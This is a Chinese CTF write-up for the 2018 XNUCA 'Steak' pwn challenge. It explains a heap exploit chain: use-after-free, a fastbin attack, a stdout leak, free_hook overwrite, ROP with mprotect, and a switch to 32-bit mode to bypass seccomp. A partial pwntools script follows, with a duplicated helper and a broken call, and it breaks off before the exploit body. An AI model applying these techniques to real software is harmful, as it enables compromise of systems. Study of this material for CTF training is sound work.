# 2018 XNUCA初赛题解 --By Lilac
## pwn
### Steak
堆漏洞挺多的:  
uaf,idx未检验  
没有输出比较麻烦  
先泄露libc地址:
    1. free 一个chunk进unsorted bin
        * partial write  fd 做fastbin atk  连上unsortedbin（1/16）后来改善用copy功能省去这16/1的概率
        2. partial write  unsorted到stdout -n 那里恰好有个 chunk size
        3. 这样控制了stdout 改flags为0xfbad1800或者0xfbad1880 partial write 掉write base 的最低字节为0
        4. puts的时候泄露libc
    5.然后修复arena
    6. 然后做fastbin atk 控制 bss 上的array往里面填freehook 用edit功能写入pus之后leak stack
    7.向bss填main的返回地址
>
> 拿到任意地址写以后，把free_hook改成puts来leak栈地址，之后直接在栈上写rop链，在bss上用mprotect开一段可执行内存，然后retf跳32位模式来绕过prctl的防护，在可执行内存上放置shellcode执行open->read->write系统调用拿
> flag
    from pwn import *
    #context.log_level='debug'
    def cmd(c):
        p.sendlineafter(">\n",str(c))
    def add(size,data="\n"):
        cmd(1)
        p.sendlineafter("size:\n",str(size))
        p.sendafter("buf:\n",data)
    def free(idx):
        cmd(2)
        p.sendlineafter("index:\n",str(idx))
    def edit(idx,buf,size=0x100):
        cmd(3)
        p.sendlineafter("index:\n",str(idx))
        p.sendlineafter("size:\n",str(size))
        p.sendafter("buf:\n",buf)
    def C(c):
        p.sendlineafter(">",str(c))
    def A(size,data="\n"):
        C(1)
        p.sendlineafter("size:",str(size))
        p.sendafter("buf:",data)
    def F(idx):
        C(2)
        p.sendlineafter("index:",str(idx))
    def E(idx,buf,size=0x100):
        C(3)
        p.sendlineafter("index:",str(idx))
        p.sendlineafter("size:",str(size))
        p.sendafter("buf:",buf)
    def cp(a,b,lenth=8):
        C(4)
        p.readuntil("index:")
        p.sendline(str(a))
        p.readuntil("index:")
        p.sendline(str(b))
        p.sendlineafter("length:",str(lenth))
    def lea():
        C()
    def cp(a,b,lenth=8):
        C(4)
        p.readuntil("index:")
        p.sendline(str(a))
        p.readuntil("index:")
        p.sendline(str(b))
        p.sendlineafter("length:",str(lenth))
    #p=process("./steak",env = {"LD_PRELOAD": "./libc-2.23.so"})
    while True:
        try: